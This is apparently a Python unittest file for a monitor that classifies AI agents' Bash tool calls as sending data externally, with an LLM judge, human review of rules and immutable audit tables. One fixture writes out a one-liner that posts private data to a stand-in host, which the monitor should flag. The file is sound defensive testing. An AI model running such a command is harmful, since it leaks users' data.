from __future__ import annotations

import json
import sqlite3
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from hook_monitor.externality.models import ExternalityVerdict
from hook_monitor.externality.providers import JudgeChainResult, JudgeObservation
from hook_monitor.runtime.externality_rules import (
    list_externality_reviews,
    lookup_externality_rule,
    prepare_externality_hook_decision,
    process_externality_jobs,
    review_externality_job,
)
from hook_monitor.runtime.parser import normalize_event
from hook_monitor.runtime.storage import EventStore


class _FakeChain:
    def __init__(self, verdict: ExternalityVerdict) -> None:
        self.verdict = verdict
        self.calls = 0

    def judge(self, envelope):  # type: ignore[no-untyped-def]
        self.calls += 1
        return JudgeChainResult(
            JudgeObservation(
                provider="codex_exec",
                model="test-model",
                envelope_sha256=envelope.digest_sha256(),
                latency_ms=1,
                verdict=self.verdict,
            ),
            (),
        )


class ExternalityRuleTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name) / "workspace"
        self.root.mkdir()
        self.db_path = Path(self.temporary.name) / "events.db"
        EventStore(self.db_path).initialize()

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def _event(self, command: str):  # type: ignore[no-untyped-def]
        return normalize_event(
            "pre_tool_use",
            {
                "session_id": "session",
                "turn_id": "turn",
                "tool_use_id": "tool-use",
                "tool_name": "Bash",
                "cwd": str(self.root),
                "tool_input": {"command": command},
            },
            workspace_root=str(self.root),
        )

    def test_hook_queues_value_free_summary_without_calling_llm(self) -> None:
        canary = "PRIVATE_QUEUE_CANARY_473c"
        with patch(
            "hook_monitor.runtime.externality_rules.resolve_judge_configuration"
        ) as resolver:
            decision = prepare_externality_hook_decision(
                self.db_path,
                self._event(f"./opaque-agent --secret {canary}"),
                workspace_root=self.root,
            )

        assert decision is not None
        self.assertEqual("queued", decision.state)
        resolver.assert_not_called()
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute(
                "SELECT envelope_json, status FROM externality_classification_jobs"
            ).fetchone()
        assert row is not None
        self.assertEqual("pending", row[1])
        self.assertNotIn(canary, row[0])
        self.assertNotIn("opaque-agent", row[0])

    def test_static_external_is_immediate_and_never_queued_or_sent_to_llm(self) -> None:
        command = (
            "python -c \"import requests; "
            "requests.post('https://example.invalid', data='PRIVATE')\""
        )
        with patch(
            "hook_monitor.runtime.externality_rules.resolve_judge_configuration"
        ) as resolver:
            decision = prepare_externality_hook_decision(
                self.db_path,
                self._event(command),
                workspace_root=self.root,
            )

        assert decision is not None
        self.assertEqual("known_external", decision.state)
        resolver.assert_not_called()
        with sqlite3.connect(self.db_path) as conn:
            count = conn.execute(
                "SELECT COUNT(*) FROM externality_classification_jobs"
            ).fetchone()[0]
        self.assertEqual(0, count)

    def test_worker_requires_human_review_before_exact_cache_is_used(self) -> None:
        first = prepare_externality_hook_decision(
            self.db_path,
            self._event("./opaque-agent"),
            workspace_root=self.root,
        )
        assert first is not None
        chain = _FakeChain(
            ExternalityVerdict(
                verdict="possibly_external",
                confidence="low",
                reason_codes=("opaque_executable",),
            )
        )
        configuration = type(
            "Configuration",
            (),
            {"status": "ready", "chain": chain, "failure_code": None},
        )()
        with patch(
            "hook_monitor.runtime.externality_rules.resolve_judge_configuration",
            return_value=configuration,
        ):
            result = process_externality_jobs(self.db_path, environ={})

        self.assertEqual(1, result["review_pending"])
        workspace_id = self._event("./opaque-agent").workspace_id
        assert workspace_id is not None
        self.assertIsNone(
            lookup_externality_rule(
                self.db_path,
                workspace_id,
                first.envelope_sha256,
            )
        )
        reviews = list_externality_reviews(self.db_path)
        self.assertEqual(1, len(reviews))
        review = reviews[0]
        self.assertNotIn("opaque-agent", json.dumps(review.to_payload()))

        match = review_externality_job(
            self.db_path,
            job_id=review.job_id,
            expected_revision=review.review_revision,
            decision="approve",
        )
        assert match is not None
        self.assertTrue(match.adds_external_sink)
        second = prepare_externality_hook_decision(
            self.db_path,
            self._event("./opaque-agent"),
            workspace_root=self.root,
        )
        assert second is not None
        self.assertEqual("cache_hit", second.state)
        self.assertEqual(match, second.rule)
        self.assertEqual(1, chain.calls)

    def test_revision_mismatch_and_unknown_approval_stop_safely(self) -> None:
        prepare_externality_hook_decision(
            self.db_path,
            self._event("./opaque-agent"),
            workspace_root=self.root,
        )
        chain = _FakeChain(
            ExternalityVerdict(
                verdict="unknown",
                confidence="low",
                reason_codes=("insufficient_evidence",),
            )
        )
        configuration = type(
            "Configuration",
            (),
            {"status": "ready", "chain": chain, "failure_code": None},
        )()
        with patch(
            "hook_monitor.runtime.externality_rules.resolve_judge_configuration",
            return_value=configuration,
        ):
            process_externality_jobs(self.db_path, environ={})
        review = list_externality_reviews(self.db_path)[0]

        with self.assertRaisesRegex(ValueError, "revision changed"):
            review_externality_job(
                self.db_path,
                job_id=review.job_id,
                expected_revision="0" * 64,
                decision="approve",
            )
        with self.assertRaisesRegex(ValueError, "unknown verdict"):
            review_externality_job(
                self.db_path,
                job_id=review.job_id,
                expected_revision=review.review_revision,
                decision="approve",
            )

    def test_approved_tables_and_review_audit_are_immutable(self) -> None:
        prepare_externality_hook_decision(
            self.db_path,
            self._event("./opaque-agent"),
            workspace_root=self.root,
        )
        chain = _FakeChain(
            ExternalityVerdict(
                verdict="external",
                confidence="high",
                reason_codes=("opaque_executable",),
            )
        )
        configuration = type(
            "Configuration",
            (),
            {"status": "ready", "chain": chain, "failure_code": None},
        )()
        with patch(
            "hook_monitor.runtime.externality_rules.resolve_judge_configuration",
            return_value=configuration,
        ):
            process_externality_jobs(self.db_path, environ={})
        review = list_externality_reviews(self.db_path)[0]
        review_externality_job(
            self.db_path,
            job_id=review.job_id,
            expected_revision=review.review_revision,
            decision="approve",
        )
        with sqlite3.connect(self.db_path) as conn:
            for table in ("externality_approved_rules", "externality_rule_reviews"):
                with self.subTest(table=table):
                    with self.assertRaisesRegex(sqlite3.IntegrityError, "immutable"):
                        conn.execute(f"DELETE FROM {table}")

    def test_approved_rule_is_scoped_to_one_workspace(self) -> None:
        first = prepare_externality_hook_decision(
            self.db_path,
            self._event("./opaque-agent"),
            workspace_root=self.root,
        )
        assert first is not None
        chain = _FakeChain(
            ExternalityVerdict(
                verdict="external",
                confidence="high",
                reason_codes=("opaque_executable",),
            )
        )
        configuration = type(
            "Configuration",
            (),
            {"status": "ready", "chain": chain, "failure_code": None},
        )()
        with patch(
            "hook_monitor.runtime.externality_rules.resolve_judge_configuration",
            return_value=configuration,
        ):
            process_externality_jobs(self.db_path, environ={})
        review = list_externality_reviews(self.db_path)[0]
        review_externality_job(
            self.db_path,
            job_id=review.job_id,
            expected_revision=review.review_revision,
            decision="approve",
        )

        other_root = Path(self.temporary.name) / "other-workspace"
        other_root.mkdir()
        other_event = normalize_event(
            "pre_tool_use",
            {
                "session_id": "other-session",
                "turn_id": "other-turn",
                "tool_use_id": "other-tool-use",
                "tool_name": "Bash",
                "cwd": str(other_root),
                "tool_input": {"command": "./opaque-agent"},
            },
            workspace_root=str(other_root),
        )
        other = prepare_externality_hook_decision(
            self.db_path,
            other_event,
            workspace_root=other_root,
        )

        assert other is not None
        self.assertEqual(first.envelope_sha256, other.envelope_sha256)
        self.assertEqual("queued", other.state)


if __name__ == "__main__":
    unittest.main()
